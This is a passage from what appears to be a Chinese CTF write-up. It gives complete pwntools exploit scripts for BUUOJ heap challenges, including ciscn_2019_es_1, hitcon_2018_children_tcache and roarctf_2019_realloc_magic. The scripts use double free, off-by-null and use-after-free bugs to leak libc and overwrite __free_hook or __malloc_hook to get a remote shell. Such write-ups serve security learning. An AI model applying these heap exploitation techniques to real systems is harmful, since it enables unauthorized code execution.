    p=remote("node3.buuoj.cn",26391)
elf=ELF(binary)
libc=elf.libc
def add(size,content):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("name:")
    p.sendline(str(size))
    p.recvuntil("servant:")
    p.sendline(content)
def edit(index,size,content):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("servant:")
    p.sendline(str(index))
    p.recvuntil("name:")
    p.sendline(str(size))
    p.recvuntil("servnat:")
    p.sendline(content)
def show():
    p.recvuntil("choice:")
    p.sendline("1")
def free(index):
    p.recvuntil("choice:")
    p.sendline("4")
    p.recvuntil("servant:")
    p.sendline(str(index))
def exp():
    
    add(0x60,"a"*0x20) # 0
    add(0x60,"b"*0x20) # 1
    add(0x60,"/bin/sh\x00") # 2
    free(1)
    payload = "a"*0x60 + p64(0) + p64(0x71) + p64(0x6020ad)
    edit(0,len(payload),payload)
    add(0x60,"a"*0x20)
    payload = "a"*3 + p64(0x60) + p64(0x602018)
    add(0x60,payload)
    show()
    addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    libc_base = addr - libc.symbols['free']
    system = libc_base + libc.sym['system']
    log.success("libc_base==>" + hex(libc_base))
    log.success("system==>" + hex(system))
    
    payload = p64(system) + p64(libc_base + libc.sym['puts'])
    edit(0,len(payload),payload)
    free(2)
    
    p.interactive()
exp()
```  
## 0x26  gyctf_2020_force  
https://n0vice.top/2020/05/09/%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0house-of-force/index.html  
## 0x27  ciscn_2019_es_1  
经典double free + tcache attack
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './ciscn_2019_es_1' 
local = 0
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",26506)
elf=ELF(binary)
#libc=ELF("/lib/i386-linux-gnu/libc.so.6")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(size,name,call):
    p.recvuntil("choice:")
    p.sendline("1")
    p.recvuntil("name")
    p.sendline(str(size))
    p.recvuntil("name:")
    p.send(name)
    p.recvuntil("call:")
    p.send(call)
def show(index):
    p.recvuntil("choice:")
    p.sendline("2")
    p.recvuntil("index:")
    p.sendline(str(index))
def free(index):
    p.recvuntil("choice:")
    p.sendline("3")
    p.recvuntil("index:")
    p.sendline(str(index))

def exp():
    add(0x4f0,"a","b")
    add(0x20,"a","b")
    add(0x40,"/bin/sh","/bin/sh")
    free(0)
    show(0)
    puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    log.success("puts_addr==>" + hex(puts_addr))
    libc_base = puts_addr - 0x3ebca0
    log.success("libc_base==>" + hex(libc_base))
    free_hook = libc_base + libc.sym["__free_hook"]
    log.success("free_hook==>" + hex(free_hook))
    system = libc_base + libc.sym['system']
    log.success("system==>" + hex(system))
    free(1)
    free(1)
    add(0x20,p64(free_hook),"a")
    add(0x20,"a","b")
    add(0x20,p64(system),"a")
    free(2)
    #gdb.attach(p)
    
    p.interactive()
exp()
```  
## 0x28 hitcon_2018_children_tcache  
off by null + tcache attack  
```python   
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './HITCON_2018_children_tcache' 
local = 0
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",29514)
elf=ELF(binary)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(size,content):
    p.recvuntil("choice: ")
    p.sendline("1")
    p.recvuntil("Size:")
    p.sendline(str(size))
    p.recvuntil("Data:")
    p.send(content)
def show(index):
    p.recvuntil("choice: ")
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline(str(index))
def free(index):
    p.recvuntil("choice: ")
    p.sendline("3")
    p.recvuntil("Index:")
    p.sendline(str(index))
def exp():
    add(0x410,"a") # 0
    add(0x28,"a") # 1
    add(0x4f0,"a") # 2
    add(0x28,"a") # 3
    free(1)
    free(0)
    for i in range (0,9):
        add(0x28-i,'a'*(0x28-i))#0
        free(0)
    add(0x28,"a"*0x20+p64(0x450)) # 0
    free(2)
    add(0x410,"a") # 1
    show(0)
    addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    libc_base = addr - 0x3ebca0
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    one = libc_base + 0x4f322
    log.success("libc_base==>" + hex(libc_base))
    log.success("malloc_hook==>" + hex(malloc_hook))
    log.success("free_hook==>" + hex(free_hook))
    log.success("system==>" + hex(system))
    
    add(0x28,"b") # 2
    free(2)
    free(0)
    
    add(0x28,p64(malloc_hook))
    add(0x28,"a")
    add(0x28,p64(one))
    p.interactive()
exp()
```  
## 0x29  roarctf_2019_realloc_magic  
利用uaf和chunk overlap改fd处的main_arena+96的后1.5字节，剩余0.5字节爆破，使其变成_IO_2_1_stdout_，然后改_IO_2_1_stdout_中的IO_write_base和flags泄露_IO_file_jumps函数地址，最后打free_hook为system  
exp  
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './roarctf_2019_realloc_magic' 
local = 0
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",25767)
elf=ELF(binary)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def add(size,content):
    p.recvuntil(">> ")
    p.sendline("1")
    p.recvuntil("Size?")
    p.sendline(str(size))
    p.recvuntil("Content?")
    p.send(content)
def free():
    p.recvuntil(">> ")
    p.sendline("2")

def exp():
    add(0x70,"a")
    add(0,"")
    add(0x100,"a")
    add(0,"")
    add(0xa0,"a")
    add(0,"")
    add(0x100,"b")
    [free() for i in range(7)]
    add(0,"")
    add(0x70,"a")
    
    payload = "a"*0x78 + p64(0x41) + '\x60\x17'
    add(0x180,payload)
    add(0,"")
    add(0x100,"a")
    add(0,"")
    
    payload = p64(0xfbad1887)+p64(0)*3+p8(0x58)
    add(0x100,payload)
    puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    log.success("puts_addr==>" + hex(puts_addr))
    libc_base = puts_addr - 0x3e82a0
    log.success("libc_base==>" + hex(libc_base))
    system = libc_base + libc.sym['system']
    log.success("system==>" + hex(system))
    free_hook = libc_base + libc.sym['__free_hook']
    log.success("free_hook==>" + hex(free_hook))
    p.sendline("666")
    add(0x120,"a")
    add(0,"")
    add(0x130,"a")
    add(0,"")
    add(0x170,"a")
    add(0,"")
    add(0x130,"a")
    [free() for i in range(7)]
    add(0,"")
    add(0x120,"a")
    payload = "a" * 0x128 + p64(0x41) + p64(free_hook-8)
    add(0x260,payload)
    add(0,"")
    add(0x130,"a")
    add(0,"")
    payload = "/bin/sh\x00" + p64(system)
    add(0x130,payload)
    free()
    
    p.interactive()
if __name__ == "__main__":
    while True:
        p = remote("node3.buuoj.cn", 25767)
        try:
            exp()
        except:
            p.close()
```  
## 0x30  
咕咕咕……  